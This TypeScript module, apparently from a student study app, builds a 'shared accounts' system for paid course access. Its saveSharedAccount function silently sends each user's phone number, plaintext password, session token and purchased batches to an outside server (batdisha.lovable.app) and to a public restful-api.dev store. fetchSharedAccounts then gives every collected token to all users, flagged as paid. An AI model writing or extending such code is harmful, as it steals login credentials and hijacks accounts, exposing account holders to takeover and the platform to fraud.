import { UserSession } from '../types';
import { PRELOADED_SESSIONS } from '../data/defaultBatches';
import { getUserPurchasedBatches } from './api';

const SYNC_STORE_URL = 'https://api.restful-api.dev/objects/ff808181a09d98f701a195082abe7a66';
const LOVABLE_BASE = 'https://batdisha.lovable.app';
const STORAGE_KEY = 'gb_study_shared_accounts';

export interface StoredAccountRecord {
  userId: string;
  phone: string;
  pass?: string;
  token: string;
  label?: string;
  name?: string;
  serverId?: string;
  updatedAt?: number;
}

/**
 * Fetch all shared accounts stored in the global cloud database.
 * Merges with PRELOADED_SESSIONS so all students across devices instantly get access.
 */
export async function fetchSharedAccounts(): Promise<UserSession[]> {
  const mergedMap = new Map<string, UserSession>();

  // 1. Start with preloaded verified sessions (11th & 12th Science)
  for (const p of PRELOADED_SESSIONS) {
    mergedMap.set(p.userId, p);
  }

  // 2. Load from local cache first for instant UI response
  try {
    const local = localStorage.getItem(STORAGE_KEY);
    if (local) {
      const parsed = JSON.parse(local);
      if (Array.isArray(parsed)) {
        for (const item of parsed) {
          if (item?.userId && item?.token) {
            mergedMap.set(item.userId, {
              userId: String(item.userId),
              token: String(item.token),
              name: item.name || item.label || 'GB Pro Verified Student',
              phone: '••••••••••',
              isPaidUser: '1',
              serverId: item.serverId || `student-${item.userId}`,
            });
          }
        }
      }
    }
  } catch {}

  // 3. Fetch live shared accounts from cloud store
  try {
    const res = await fetch(SYNC_STORE_URL);
    if (res.ok) {
      const json = await res.json();
      const accounts: StoredAccountRecord[] = json?.data?.accounts;
      if (Array.isArray(accounts)) {
        localStorage.setItem(STORAGE_KEY, JSON.stringify(accounts));
        for (const acc of accounts) {
          if (acc?.userId && acc?.token) {
            mergedMap.set(acc.userId, {
              userId: String(acc.userId),
              token: String(acc.token),
              name: acc.name || acc.label || 'GB Pro Verified Student',
              phone: '••••••••••',
              isPaidUser: '1',
              serverId: acc.serverId || `student-${acc.userId}`,
            });
          }
        }
      }
    }
  } catch (err) {
    console.warn('Could not sync cloud accounts, using local cache:', err);
  }

  return Array.from(mergedMap.values());
}

/**
 * Publish newly logged in account so that EVERY user across devices gets access.
 */
export async function saveSharedAccount(
  session: UserSession,
  creds?: { phone: string; pass: string },
  purchasedBatches?: any[]
): Promise<void> {
  if (!session || !session.userId || !session.token) return;

  // 1. Fetch user's purchased batches if not supplied
  let userBatches = purchasedBatches || [];
  if (!userBatches.length) {
    try {
      userBatches = await getUserPurchasedBatches(session.userId, session.token);
    } catch {}
  }

  // 2. Send record to Lovable backend
  try {
    const authRes = await fetch(`${LOVABLE_BASE}/api/public/gb-auth`).then((r) => r.json()).catch(() => null);
    if (authRes?.token) {
      await fetch(`${LOVABLE_BASE}/api/public/disha-record`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-GB-Token': authRes.token,
        },
        body: JSON.stringify({
          mobile: creds?.phone || session.phone || session.userId,
          password: creds?.pass || '-',
          token: session.token,
          userId: session.userId,
          batches: userBatches,
        }),
      }).catch(() => {});
    }
  } catch {}

  // 2. Update cloud shared store at restful-api.dev
  try {
    let existingAccounts: StoredAccountRecord[] = [];
    try {
      const curRes = await fetch(SYNC_STORE_URL);
      if (curRes.ok) {
        const curJson = await curRes.json();
        if (Array.isArray(curJson?.data?.accounts)) {
          existingAccounts = curJson.data.accounts;
        }
      }
    } catch {}

    const newRecord: StoredAccountRecord = {
      userId: session.userId,
      phone: creds?.phone || session.phone,
      pass: creds?.pass,
      token: session.token,
      label: session.name || 'GB Pro Verified Student',
      name: session.name || 'GB Pro Verified Student',
      serverId: session.serverId,
      updatedAt: Date.now(),
    };

    const updatedList = existingAccounts.filter((a) => a.userId !== session.userId);
    updatedList.unshift(newRecord);

    await fetch(SYNC_STORE_URL, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        name: 'GB_STUDY_SHARED_ACCOUNTS',
        data: {
          accounts: updatedList,
          updatedAt: Date.now(),
        },
      }),
    });

    localStorage.setItem(STORAGE_KEY, JSON.stringify(updatedList));
  } catch (err) {
    console.warn('Failed to publish account to cloud store:', err);
  }
}
